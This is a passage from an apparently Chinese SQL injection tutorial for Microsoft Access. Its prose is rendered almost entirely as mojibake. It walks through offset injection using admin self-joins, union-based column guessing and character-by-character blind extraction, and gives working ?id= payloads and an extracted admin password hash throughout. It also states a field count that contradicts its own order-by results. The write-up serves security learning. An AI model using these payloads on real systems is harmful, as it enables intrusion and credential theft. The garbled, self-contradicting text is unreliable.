1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin è¿™é‡Œå‰é¢ä¾æ—§æ·»åŠ 1=2æ˜¯ä¸ºäº†è®©1513 and 1=2è¿™ä¸ªæ•´ä½“æŠ¥é”™ï¼Œä»¥é˜²å ç”¨å›æ˜¾ä½ã€‚ å¦‚ä¸Šå›¾æ‰€ç¤ºå‘ç°å›æ˜¾ä½ä¸º3ã€9ã€13ã€15 è‡³äºä¸ºä½•è¿™é‡Œéè¦åœ¨åé¢åŠ å…¥from adminæˆ‘ä¹Ÿäº§ç”Ÿäº†ç–‘é—®ï¼Œå› ä¸ºæˆ‘è®°å¾—mysqlæ•°æ®åº“æ˜¯ä¸éœ€è¦çš„ï¼Œäºæ˜¯æˆ‘å»æ‰è¿™ä¿©å•è¯åå‘ç°å¦‚ä¸‹ å¦‚å›¾ï¼Œè¿™ä»£è¡¨æˆ‘ä»¬åœ¨æŸ¥è¯¢å›æ˜¾ä½è¿˜å¿…é¡»å¸¦ä¸€ä¸ªæ­£ç¡®çš„è¡¨ã€‚ã€‚ã€‚ã€‚ 4.3.6 ç¡®å®šç›®æ ‡è¡¨çš„å­—æ®µæ•°é‡ è¿™é‡Œæ˜¯ç¡®å®šadminè¡¨çš„å­—æ®µæ•°é‡ï¼ˆæ³¨æ„è¿™é‡Œè¿˜è¦åœ¨ç¡®å®šçš„åŸå› æˆ‘æƒ³æ˜¯ï¼Œæˆ‘ä»¬è¿›å…¥è¯¥é¡µé¢æŸ¥è¯¢çš„æ—¶å€™ï¼Œå½“å‰è¡¨å¹¶éadminè¡¨ï¼‰ è¿™é‡Œå‘¢æˆ‘ä»¬æ ¹æ®å½“å‰é¡µé¢è·¯å¾„å»æºç æŸ¥æ‰¾éªŒè¯ä¸€ä¸‹ å¦‚ä¸Šå›¾ï¼Œæœç„¶è¿™é‡ŒæŸ¥è¯¢çš„è¡¨ä¸ºproductè¡¨ ?id=1513 and exists(select * from admin order by 6) é¡µé¢å›æ˜¾æ­£å¸¸ ?id=1513 and exists(select * from admin order by 7) é¡µé¢å›æ˜¾é”™è¯¯ è¯´æ˜adminè¡¨çš„å­—æ®µæ•°ä¸º6ä¸ªï¼Œæˆ‘ä»¬æŸ¥çœ‹æ•°æ®åº“éªŒè¯ä¸€ä¸‹ å¦‚ä¸Šå›¾å¾ˆæ˜æ˜¾æ˜¯æ­£ç¡®çš„ï¼ 4.3.7 è¿›è¡Œåç§»æ³¨å…¥ åç§»æ³¨å…¥çš„åŸºæœ¬å…¬å¼ï¼š è”åˆæŸ¥è¯¢æ‰€è¦è¡¥å……çš„å­—æ®µæ•° = å½“å‰å­—æ®µæ•°é‡ - ç›®æ ‡è¡¨çš„å­—æ®µæ•° x Nï¼ˆN=1,2...ï¼‰ã€æ³¨æ„ï¼šâ€œè”åˆæŸ¥è¯¢æ‰€è¦è¡¥å……çš„å­—æ®µæ•°â€ æŒ‡çš„æ˜¯unionå…³é”®å­—åé¢çš„selectæŸ¥è¯¢æ‰€éœ€è¡¥å……çš„å­—æ®µæ•°ã€‘ åœ¨æ­¤å¤„å³ä¸ºï¼šè”åˆæŸ¥è¯¢è¡¥å……å­—æ®µæ•° = å½“å‰å­—æ®µæ•°é‡ï¼ˆ22ï¼‰ - adminè¡¨çš„å­—æ®µæ•°ï¼ˆ6ï¼‰ x N å½“N=1æ—¶æˆ‘ä»¬ç§°ä¸º â€œ1çº§åç§»æ³¨å…¥â€ï¼Œå½“N=2æ—¶æˆ‘ä»¬ç§°ä¸º â€œ2çº§åç§»æ³¨å…¥â€ï¼›å½“N=3æ—¶æˆ‘ä»¬ç§°ä¸º â€œ3çº§åç§»æ³¨å…¥â€ï¼Œâ€¦ 1çº§åç§»æ³¨å…¥çš„payloadï¼š æ ¹æ®å…¬å¼æˆ‘ä»¬å¯ä»¥è®¡ç®—å‡ºï¼šè”åˆæŸ¥è¯¢è¡¥å……å­—æ®µæ•° = 22-6x1 = 16 ?id=1513 union select top 1 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16, * from admin åœ¨è¿™é‡Œæˆ‘ä»¬è§£é‡Šä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆ1çº§åç§»æ³¨å…¥å¹¶æ²¡æœ‰çˆ†å‡ºæˆ‘ä»¬æƒ³è¦çš„å­—æ®µå€¼å‘¢ï¼š ç”±å‰é¢çš„æ­¥éª¤æˆ‘ä»¬å·²ç»å¾—çŸ¥ï¼Œå·²ç»ç¡®å®šçš„æ˜¾ç¤ºä½åªæœ‰ 3,9,13,15 å››ä¸ªï¼Œå³åªæœ‰å¤„äºç¬¬3,9,13,15è¿™å››ä¸ªå­—æ®µçš„æ•°æ®æ‰å¯ä»¥æ˜¾ç¤ºå‡ºæ¥ï¼Œ ä½†æ˜¯æˆ‘ä»¬è§‚å¯Ÿä¸‹æ ‡å‘ç°ï¼Œåœ¨è¿›è¡Œ1çº§åç§»æ³¨å…¥æ—¶ï¼Œadminè¡¨çš„æ•°æ®å®é™…ä¸Šæ˜¯æ’åœ¨äº†17å·å­—æ®µä¹‹åäº†ï¼Œå½“ç„¶ä¸ä¼šåœ¨é¡µé¢ä¸­æ˜¾ç¤ºå‡ºæ¥ã€‚ é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆæ ·æ‰å¯ä»¥å°†adminè¡¨çš„æ•°æ®å‘å‰ç§»åŠ¨ï¼Œä»¥è‡´å¯ä»¥ä½¿å…¶å¤„äºç¬¬3,9,13,15å·å­—æ®µè€Œæ˜¾ç¤ºå‡ºæ¥å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯ï¼šæˆ‘ä»¬å¯ä»¥è¿›è¡Œ2çº§(å¤šçº§)åç§»æ³¨å…¥ï¼ˆå³é€šè¿‡adminè¡¨çš„è‡ªè¿æ¥ä½¿å¾—sqlè¯­å¥ä¸­â€œ * â€æ‰€ä»£è¡¨çš„çš„å­—æ®µæ•°å¢å¤§ï¼Œé‚£ä¹ˆè”åˆæŸ¥è¯¢ä¸­ç”¨äºå……æ•°å­—æ®µå°±ä¼šå‡å°ï¼Œè¿™æ ·çš„è¯ï¼Œadminè¡¨ä¸­çš„æ•°æ®è‡ªç„¶ä¼šå‘å‰ç§»åŠ¨äº†ï¼‰ è¿™é‡Œé™„ä¸Šå‚è€ƒæ–‡ç« çš„å›¾ç‰‡ï¼Œè§£é‡Šçš„æ¯”è¾ƒæ¸…æ™° 2çº§åç§»æ³¨å…¥çš„payloadï¼š æ ¹æ®å…¬å¼æˆ‘ä»¬å¯ä»¥è®¡ç®—å‡ºï¼šè”åˆæŸ¥è¯¢è¡¥å……å­—æ®µæ•° = 22-6x2 = 10 ?id=1513 union select 1,2,3,4,5,6,7,8,9,10, * from (admin a inner join admin b on a.id=b.id) è¿™é‡Œæˆ‘ä»¬è¾“å…¥payloadä¹‹åæŸ¥çœ‹æºä»£ç å‘ç°13å›æ˜¾ä½çˆ†å‡ºäº†åŠ å¯†çš„å¯†ç  ä½†è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ é€šè¿‡åˆ†æä¸‹å›¾æˆ‘ä»¬å‘ç°ï¼Œç»è¿‡2çº§åç§»æ³¨å…¥ï¼Œæˆ‘ä»¬æˆåŠŸçš„å°†adminè¡¨çš„æ•°æ®å‘å‰ç§»åŠ¨äº†6ä¸ªå­—æ®µï¼Œä½¿å…¶åŸæœ¬åœ¨17å·å­—æ®µåŠå…¶ä¹‹åæ‰æ˜¾ç°å‡ºçš„æ•°æ®ï¼Œå˜ä¸ºäº†åœ¨11å·å­—æ®µåŠå…¶ä¹‹åå°±å¯å›æ˜¾è€Œå‡ºã€‚è€Œæ­¤æ—¶adminè¡¨çš„passwordå­—æ®µå’Œcount_timeå­—æ®µæ°å¥½å¤„äºæ˜¾ç¤ºä½13å’Œ15ä¸Šï¼Œäºæ˜¯å°±è‡ªç„¶è€Œç„¶çš„æš´éœ²äº†å‡ºæ¥ã€‚ é‚£åˆä¸ºä»€ä¹ˆadminè¡¨çš„æ•°æ®ä¼šå‘å‰ç§»åŠ¨6ä¸ªå­—æ®µå‘¢ï¼Ÿ åŸå› å°±æ˜¯ï¼Œç”±äºadminè¡¨è¿›è¡Œäº†ä¸€æ¬¡è‡ªè¿æ¥ï¼Œä½¿å¾—payloadä¸­fromå…³é”®å­—åé¢çš„è¡¨ç”±åŸæœ‰çš„ â€œadminè¡¨â€ å˜æˆäº†ï¼šç”±â€œå…ˆè®©adminè‡ªå·±åšç¬›å¡å°”ç§¯ç„¶åæŒ‘é€‰idå€¼ç›¸ç­‰çš„è®°å½•â€ç»„æˆçš„è¡¨ã€‚è¿™æ ·çš„è¯ï¼Œpayloadä¸­çš„â€œ * â€å°±ç”±åŸæ¥æ‰€ä»£è¡¨çš„ â€œadminè¡¨â€ ä¸­çš„6ä¸ªå­—æ®µï¼Œå˜ä¸ºäº†ç°åœ¨æ‰€ä»£è¡¨çš„ â€œadminè‡ªè¿æ¥è¡¨â€ çš„12ä¸ªå­—æ®µï¼Œåˆç”±äºunionå…³é”®å­—çš„ä½¿ç”¨ï¼Œè¦æ±‚unionå…³é”®å­—åé¢selectæŸ¥è¯¢çš„å­—æ®µæ•°å¿…é¡»è¦ç­‰äºå‰é¢selectæŸ¥è¯¢çš„å­—æ®µæ•°ï¼Œæ‰€ä»¥unionå…³é”®å­—åé¢çš„selectä¸­ç”¨äºå……æ•°çš„å­—æ®µç”±åŸæ¥çš„22-6=16å˜ä¸ºäº†22-12=10ä¸ªå­—æ®µï¼Œå› æ­¤ç”±äºå……æ•°çš„å­—æ®µå˜å°‘äº†ï¼Œé‚£ä¹ˆadminè¡¨çš„æ•°æ®è‡ªç„¶çš„å°±å¯ä»¥å‘å‰ç§»åŠ¨äº†ã€‚ è¯·æ³¨æ„ï¼šadminè¡¨ä¸­çš„æ•°æ®å‘å‰ç§»åŠ¨çš„å­—æ®µæ•°åªèƒ½æ˜¯adminè¡¨ï¼ˆå³ç›®æ ‡è¡¨ï¼‰å­—æ®µæ•°çš„æ•´æ•°å€ï¼ˆè¿™æ˜¯ç”±è¡¨è‡ªè¿æ¥çš„ç‰¹æ€§æ‰€å†³å®šçš„ï¼‰ã€‚ ä½†è¿™é‡Œæˆ‘çš„adminè¡¨ä¼¼ä¹æ•°æ®ä¸å¯¹åŠ²ï¼Œåªæœ‰ä¸€ç»„æ•°æ®ï¼Œæ€ªä¸å¾—æˆ‘ä¸€ç›´æä¸æ‡‚ä¸Šè¿°æ“ä½œçš„åŸç† ï¼ˆæˆ‘è¿˜ä»¥ä¸ºæ˜¯æˆ‘å‚»ï¼‰ã€‚ã€‚ã€‚ã€‚ ä¸è¿‡ä»”ç»†é˜…è¯»å‚è€ƒæ–‡ç« ï¼Œæˆ‘è®¤ä¸ºè¿™é‡Œè¿›è¡Œç¬›å¡å°”ç§¯çš„æ“ä½œä¹‹åæ˜¯å°†åŒidï¼ˆ6ä¸ªå­—æ®µï¼‰è¿æ¥äº†èµ·æ¥è€Œå½¢æˆ12ä¸ªå­—æ®µçš„â€œæ–°è¡¨â€ é™„ä¸Šå›¾ç‰‡ï¼š åœ¨æ­¤æˆ‘ä»¬å·²ç»çˆ†å‡ºäº†adminè¡¨çš„å¯†ç ï¼Œ æ­¤æ—¶ï¼Œå…¶å®adminè¡¨çš„adminå­—æ®µå°±ç´§æŒ¨åœ¨passwordå­—æ®µçš„å‰æ–¹ï¼ˆå…¶å®åœ¨å®æˆ˜ç¯å¢ƒä¸­æˆ‘ä»¬æ˜¯ä¸ç¡®å®šadminå­—æ®µæ˜¯åœ¨å‰è¿˜æ˜¯åœ¨åçš„ï¼Œæ­¤å¤„åªæ˜¯ä¸ºäº†æ–¹ä¾¿åŸç†çš„è®²è§£ï¼Œå°±ç›´æ¥å‘Šè¯‰ä½ äº†ï¼‰ é‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦ä»ç„¶å¯ä»¥å°†æ•°æ®å‘å‰ç§»åŠ¨è€Œçˆ†å‡ºadminå­—æ®µçš„å€¼å‘¢ï¼Ÿåœ¨è¿™é‡Œæ˜¾ç„¶æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºæˆ‘ä»¬åªèƒ½å‘å‰ç§»åŠ¨adminè¡¨çš„å­—æ®µæ•°é‡çš„æ•´æ•°å€ï¼ˆåœ¨è¿™é‡Œå³æ˜¯6çš„æ•´æ•°å€ï¼‰ï¼Œè€Œæ­¤æ—¶adminè¡¨çš„adminå­—æ®µæ­¤æ—¶æ‰€å¤„å­—æ®µä¸º12å·å­—æ®µï¼Œå†å‘å‰ç§»åŠ¨6ä¸ªå­—æ®µçš„è¯ï¼Œadminå­—æ®µå°±å¤„äº6å·å­—æ®µå¤„äº†ï¼Œä»ç„¶æ²¡æœ‰ä¸æ˜¾ç¤ºä½çš„ä½ç½®å‘ç”Ÿé‡åˆã€‚ åˆ°äº†è¿™é‡Œï¼Œç»†å¿ƒçš„åŒå­¦ä¼šå‘ç°ï¼š ä¹‹å‰æˆ‘ä»¬è®²çš„éƒ½æ˜¯å¦‚ä½•å°†adminè¡¨ä¸­çš„æ•°æ®å‘å‰ç§»åŠ¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä¸å¯ä»¥ä½¿å¾—æ•°æ®å‘åç§»åŠ¨å‘¢ï¼Ÿè¦æ˜¯å¯ä»¥å‘åç§»åŠ¨çš„è¯ï¼Œç´§æ¥ç€2çº§åç§»ï¼Œç„¶åè®©æ•°æ®å‘åç§»åŠ¨ä¸€ä¸ªå­—æ®µï¼Œä¸å°±æ­£å¥½è®©adminå­—æ®µå¤„äº13å·æ˜¾ç¤ºä½äº†å—ï¼Ÿ æ­å–œä½ ï¼ä½ çš„æƒ³æ³•æ˜¯å¯¹çš„ï¼Œæˆ‘ä»¬çš„ç¡®å¯ä»¥è®©adminè¡¨çš„æ•°æ®å‘åç§»åŠ¨ï¼Œä¸è¿‡é—æ†¾çš„æ˜¯ï¼Œå‘åç§»åŠ¨çš„å­—æ®µæ•°ä»ç„¶å–å†³äºï¼šæˆ‘ä»¬èƒ½å¤ŸçŒœè§£å‡ºadminè¡¨ä¸­å¤šå°‘ä¸ªå­—æ®µåã€‚è‹¥çŒœè§£å‡º1ä¸ªå­—æ®µåï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è®©æ•°æ®å‘åç§»åŠ¨1ä¸ªå­—æ®µæ•°ï¼Œè‹¥çŒœè§£å‡º2ä¸ªå­—æ®µåï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è®©æ•°æ®å‘åç§»åŠ¨2ä¸ªå­—æ®µæ•°ï¼Œä»¥æ­¤ç±»æ¨ã€‚ï¼ˆä¸è¿‡è¿™é‡Œæ‰€éœ€è¦çŒœè§£çš„å­—æ®µåä¸éœ€è¦æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥æ‰¾çš„å­—æ®µåï¼Œåªè¦æ˜¯adminè¡¨ä¸­çš„å­—æ®µåå‡å¯ï¼‰ï¼ŒåŸå› è¯·ç»§ç»­å¾€åé˜…è¯»ï¼š å¾®è°ƒpayloadï¼š ?id=1513 union select top 1 1,2,3,4,5,6,7,8,9,10,b.id, * from (admin a inner join admin b on a.id=b.id) æ ¹æ®é¡µé¢è¿”å›çš„æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ç¬¬13å·æ˜¾ç¤ºä½æˆ‘ä»¬æˆåŠŸçš„çˆ†å‡ºäº†adminå­—æ®µçš„ç¬¬ä¸€ä¸ªå€¼:admin åŸå› ï¼š æˆ‘ä»¬å…ˆè§‚å¯Ÿsqlè¯­å¥ï¼Œå‘ç°unionå…³é”®å­—åé¢çš„selectæŸ¥è¯¢çš„å¡«å……å­—æ®µå¤šäº†ä»£ç â€œb.idâ€ï¼Œæ„æ€æ˜¯åœ¨æ­¤è¾“å‡ºbè¡¨ï¼ˆadminè¡¨çš„åˆ«åä¹‹ä¸€ï¼‰çš„idå­—æ®µå€¼ï¼Œç”±äºæ­¤å¤„å·²ç»æ˜¾å¼çš„æŒ‡å‡ºidå­—æ®µå€¼çš„è¾“å‡ºä½ç½®ï¼Œé‚£ä¹ˆåé¢çš„ â€œ * â€ å°±ä¼šè‡ªåŠ¨çš„è¯†åˆ«ï¼Œå°±åªè¾“å‡ºadminè‡ªè”è¡¨å‰©ä¸‹çš„å­—æ®µå€¼äº†ï¼Œä»è€Œä½¿å¾—å‰©ä½™æ•°æ®å‡å‘åç§»åŠ¨äº†ä¸€ä¸ªå­—æ®µï¼Œè®©åŸæœ¬åœ¨13å·å­—æ®µçš„adminå­—æ®µå‘åç§»åŠ¨äº†1ä½ï¼Œåˆ°äº†13å·æ˜¾ç¤ºä½ä¸Šäº†ã€‚ ä½†è¯·æ³¨æ„ï¼šæ­¤å¤„çš„idå­—æ®µåæ˜¯æˆ‘ä»¬å·²ç»çŒœè§£å‡ºçš„ è¿™ä¹Ÿå°±å›ç­”äº†ä¸Šè¿°æ‰€è¯´çš„ï¼šâ€œå‘åç§»åŠ¨çš„å­—æ®µæ•°ä»ç„¶å–å†³äºï¼šæˆ‘ä»¬èƒ½å¤ŸçŒœè§£å‡ºadminè¡¨ä¸­å¤šå°‘ä¸ªå­—æ®µåï¼Œä¸è¿‡è¿™é‡Œæ‰€éœ€è¦çŒœè§£çš„å­—æ®µåä¸éœ€è¦å¿…é¡»æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥æ‰¾çš„å­—æ®µåï¼Œåªè¦æ˜¯adminè¡¨ä¸­çš„å­—æ®µåå‡å¯â€ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è®©adminæ•°æ®å‘åç§»åŠ¨2ä¸ªå­—æ®µå€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦çŸ¥é“é™¤äº†idå­—æ®µåå¤–ï¼Œå…¶ä»–ä»»ä¸€å­—æ®µåå³å¯ï¼Œç„¶åæ„é€ å¦‚ä¸‹payloadï¼š?id=1513 union select top 1 1,2,3,4,5,6,7,8,9,10,b.id,b.å­—æ®µå * from (admin a inner join admin b on a.id=b.id) é™„ä¸Šå›¾ç‰‡ï¼š 0x05 æ€»ç»“ è¿™é‡Œä¾æ—§cväº†ä¸€ä¸‹é‚£ç¯‡å‚è€ƒæ–‡ç« (â”­â”®ï¹â”­â”®å¤ªèœäº†,æ²¡è‡ªå·±çš„æƒ³æ³•) è‡³æ­¤ï¼Œæ•´ä¸ªæµ‹è¯•å·²ç»“æŸï¼Œæˆ‘ä»¬æˆåŠŸçš„çˆ†å‡ºäº† è´¦å·ä¸å¯†ç ï¼šadmin/a48e190faf æ¥ä¸‹æ¥æˆ‘ä¼šä¾æ¬¡æå‡ºå‡ ä¸ªé—®é¢˜ï¼Œç„¶åä¸€ä¸€è¿›è¡Œè§£ç­”ï¼š å¦‚æœæˆ‘ä»¬ä»ç„¶é‡‡ç”¨ä¸Šè¿°ç¯å¢ƒï¼Œé‚£å¯ä¸å¯ä»¥è¿›è¡Œ3çº§åç§»å’Œå››çº§åç§»å‘¢ï¼Ÿ ç­”ï¼š3çº§åç§»å¯ä»¥ï¼Œä½†æ˜¯4çº§åç§»ä¸è¡Œï¼Œå› ä¸ºå¦‚æœè¿›è¡Œ4çº§åç§»çš„è¯ï¼Œå°±ä¼šä½¿å¾—åç§»æ³¨å…¥åŸºæœ¬å…¬å¼ï¼šè”åˆæŸ¥è¯¢è¡¥å……å­—æ®µæ•°=å½“å‰å­—æ®µæ•°é‡-ç›®æ ‡è¡¨çš„å­—æ®µæ•° x 4 ==&gt; 22-6x4=-2&lt;0ï¼Œå³ï¼šä¼šé€ æˆunionå…³é”®å­—ä¹‹å‰çš„selectæŸ¥è¯¢å­—æ®µæ•°çš„æ•°é‡ &lt; unionå…³é”®å­—ä¹‹åçš„å­—æ®µæ•°é‡ï¼Œä»è€Œå¯¼è‡´æŸ¥è¯¢å¤±è´¥ã€‚ 3çº§åç§»çš„payloadï¼š?id=1513 union select top 1 1,2,3,4, * from((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id) accessåç§»æ³¨å…¥æ˜¯å¦æ˜¯çœŸçš„éšæœºï¼Ÿ é€šè¿‡ä¸Šè¿°åŸç†çš„è®²è§£ï¼Œè¿™ä¸ªé—®é¢˜ä¹Ÿå°±ä¸æ”»è‡ªç ´äº†ï¼Œæ˜¾ç„¶accessæ³¨å…¥å¹¶ä¸æ˜¯çœŸæ­£çš„éšæœºï¼Œå¹¶ä¸æ˜¯å®Œå…¨ä¸å—æˆ‘ä»¬æ§åˆ¶çš„ï¼Œåœ¨æˆ‘ä»¬è·å–è¶³å¤Ÿä¿¡æ¯çš„æƒ…å†µä¸‹ï¼ˆâ€œç›®æ ‡è¡¨â€çš„å­—æ®µæ•°é‡ï¼Œå½“å‰å­—æ®µæ•°é‡ï¼Œå·²çŸ¥çš„â€œç›®æ ‡è¡¨å­—æ®µå\"çš„æ•°é‡ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸€å®šèŒƒå›´å†…å®Œå…¨æ§åˆ¶æ˜¾ç¤ºä½å¤„çš„æ•°æ®æ˜¾ç¤ºï¼Œè€Œä¹‹æ‰€ä»¥è¯´æ˜¯ä¸€å®šèŒƒå›´å†…ï¼Œåªæ˜¯å› ä¸º â€œæ˜¾ç¤ºä½çš„ä½ç½®â€ å’Œ â€œæˆ‘ä»¬å¯ä»¥çŒœè§£åˆ°çš„ç›®æ ‡è¡¨å­—æ®µåçš„æ•°é‡â€ è¿™ä¸¤ä¸ªå› ç´ ä¸æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ã€‚ æ˜¯å¦å¯ä»¥åªè¯´ï¼šâ€œå½“å‰è¡¨â€çš„å­—æ®µæ•°è¶Šå¤šæˆåŠŸç‡è¶Šå¤§ï¼Œæˆ–â€œç›®æ ‡è¡¨â€çš„å­—æ®µæ•°è¶Šå°‘æˆåŠŸç‡è¶Šå¤§ï¼Ÿ æ˜¾ç„¶æˆ‘ä»¬ä¸èƒ½è¿™æ ·ç®€å•çš„å¾—å‡ºç»“è®ºï¼Œåç§»æ³¨å…¥æ˜¯å¦èƒ½å¤ŸæˆåŠŸï¼Œå–å†³äºï¼šâ€œæ˜¾ç¤ºä½ä½ç½®â€ å’Œ â€œç›®æ ‡å­—æ®µèƒ½å¤Ÿç§»åŠ¨åˆ°çš„ä½ç½®â€ æ˜¯å¦å¯ä»¥é‡åˆï¼Œå¦‚æœå¯ä»¥é‡åˆçš„è¯ï¼Œå³ä½¿â€œå½“å‰è¡¨â€å­—æ®µæ•°å°ä¸€ç‚¹ï¼Œâ€œç›®æ ‡è¡¨â€å­—æ®µæ•°å¤šä¸€ç‚¹ä¹Ÿæ˜¯æ— å¦¨çš„ï¼ˆä½†ä¸‡ä¸‡ä¸å¯â€œå½“å‰è¡¨â€çš„å­—æ®µæ•°é‡ &lt; â€œç›®æ ‡è¡¨â€çš„å­—æ®µæ•°é‡ï¼‰ æ˜¯ä»€ä¹ˆå†³å®šç€â€œç›®æ ‡è¡¨â€çš„æ•°æ®ä¸€æ¬¡æ€§å‰ç§»çš„å­—æ®µæ•°ï¼Ÿæ˜¯ä»€ä¹ˆå†³å®šç€â€œç›®æ ‡è¡¨â€çš„æ•°æ®å¯ä»¥åç§»çš„å­—æ®µæ•°ï¼Ÿ å‰è€…æ˜¯ç”± â€œç›®æ ‡è¡¨çš„å­—æ®µæ•°é‡â€ æ‰€å†³å®šçš„ï¼šç›®æ ‡è¡¨ä¸­çš„æ•°æ® å‘å‰ç§»åŠ¨çš„å­—æ®µæ•° åªèƒ½æ˜¯ ç›®æ ‡è¡¨ä¸­çš„å­—æ®µæ•°çš„æ•´æ•°å€ï¼ˆè¿™æ˜¯ç”±è¡¨è‡ªè¿æ¥çš„ç‰¹æ€§æ‰€å†³å®šçš„ï¼‰ã€‚ åè€…æ˜¯ç”± â€œæˆ‘ä»¬å¯ä»¥çŒœè§£å¾—åˆ°çš„ç›®æ ‡è¡¨çš„å­—æ®µåæ•°é‡â€ æ‰€å†³å®šã€‚è‹¥çŒœè§£å‡º1ä¸ªå­—æ®µåï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è®©æ•°æ®å‘åç§»åŠ¨1ä¸ªå­—æ®µæ•°ï¼Œè‹¥çŒœè§£å‡º2ä¸ªå­—æ®µåï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è®©æ•°æ®å‘åç§»åŠ¨2ä¸ªå­—æ®µæ•°ï¼Œä»¥æ­¤ç±»æ¨ã€‚ï¼ˆä¸è¿‡è¿™é‡Œæ‰€éœ€è¦çŒœè§£çš„å­—æ®µåä¸éœ€è¦å¿…é¡»æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥æ‰¾çš„å­—æ®µåï¼Œåªè¦æ˜¯adminè¡¨ä¸­çš„å­—æ®µåå‡å¯ï¼‰ å¯ä»¥çœ‹åˆ°ä¸Šè¿°çš„ä¸‰çº§åç§»æ˜¯è¿›è¡Œäº†ä¸¤æ¬¡ç¬›å¡å°”ç§¯çš„æ“ä½œ ä¸å¾—ä¸è¯´è¿™ä¸ªåç§»æ³¨å…¥çœŸçš„å‰å®³ï¼ŒçœŸæœ‰ä¸€ç§é»‘å®¢çš„æ„Ÿè§‰ è¿™é‡Œé¡ºä¾¿æ€»ç»“æ¯”è¾ƒä¸€ä¸‹è”åˆæ³¨å…¥å’Œé€å­—çŒœè§£è¯­å¥ 5.1 è”åˆæ³¨å…¥ å…ˆæ˜¯åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº† 5.1.1 åˆ¤æ–­å­—æ®µæ•° ?id=1513 order by 22 #é¡µé¢æ­£å¸¸ ?id=1513 order by 23 #é¡µé¢æŠ¥é”™ è¯´æ˜å½“å‰è¡¨çš„å­—æ®µæ•°ä¸º16 5.1.2 çˆ†å‡ºå›æ˜¾ä½ ?id=1513 union select å­—æ®µæ•° from æ­£ç¡®è¡¨å éšæœºæŸ¥çœ‹é¡µé¢æˆ–è€…æºä»£ç çœ‹é‚£äº›å­—æ®µæ˜¯å¯ä»¥å›æ˜¾çš„ 5.1.3 çŒœæµ‹è¡¨å ?id=1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin â€”â€”çŒœè¡¨åï¼ˆæŠ¥é”™è¯´æ˜è¡¨åä¸å­˜åœ¨ï¼Œå°†adminæ¢æˆåˆ«çš„ç»§ç»­çŒœï¼‰ 5.1.4 çŒœæµ‹åˆ—å ?id=1513 union select 1,2,username,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin â€”â€”çŒœåˆ—åï¼ˆåˆ—åä½ç½®æ”¾ç½®é¡µé¢ä¸Šæ˜¾ç¤ºçš„æ•°å­—ä½ç½®ä¸Šï¼‰ï¼ˆæŠ¥é”™è¯´æ˜åˆ—åä¸å­˜åœ¨ï¼Œæ¢åˆ—æ˜ç»§ç»­çŒœï¼‰ï¼ˆåˆ—åçŒœå¯¹ååŠå‡ºè´¦å·å¯†ç ï¼‰ 5.2 é€å­—çŒœè§£æ³• å…ˆæ˜¯åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œä¹Ÿä¸èµ˜è¿° 5.2.1 çŒœæµ‹è¡¨å ?id=1513 and exists (select * from admin) â€”â€”çŒœè¡¨å é¡µé¢æ­£å¸¸å³çŒœæµ‹æ­£ç¡® 5.2.2 çŒœæµ‹åˆ—å ?id=1513 and exists (select user_name from admin) â€”â€”çŒœåˆ—å é¡µé¢æ­£å¸¸å³çŒœæµ‹æ­£ç¡® 5.2.3 çˆ†æ•°æ® 1.ç¡®å®šé•¿åº¦ 2.ç¡®å®šascæ•°æ®(ascç¼–ç ) ?id=1513 and (select top 1 len(user_name ) from admin)=5(user_name çš„é•¿åº¦=5ï¼Œæ­£å¸¸åˆ™=5ï¼Œä¹Ÿå¯ä»¥ç”¨&gt;,&lt;å·å»åˆ¤æ–­ï¼‰ ?id=1513 and (select top 1 asc(mid(user_name ,1,1)) from admin)=97 åˆ¤æ–­ç¬¬ä¸€ä½ï¼ˆ97ä»£è¡¨â€˜aâ€™çš„ascllå€¼ï¼‰ ?id=1513 and (select top 1 asc(mid(user_name ,2,1)) from admin)=97 åˆ¤æ–­ç¬¬äºŒä½ ï¼ˆuser_name =admin ç¬¬ä¸€ä½a ç¬¬äºŒä½d ç¬¬ä¸‰ä½m ç¬¬å››ä½i ç¬¬äº”ä½n pass_word=a48e190fafc257d3ï¼‰ æ›´å¤šéªšæ“ä½œå°±ä¸èµ˜è¿°äº†ï¼Œæ—¥åç¢°åˆ°çš„è¯åœ¨æ‰¾ï¼Œè¿™é‡Œä¸»è¦å°±æ˜¯äº†è§£æ•°æ®åº“çš„ç‰¹æ€§ä»¥åŠå¸¸è§„è¯­å¥ã€‚ 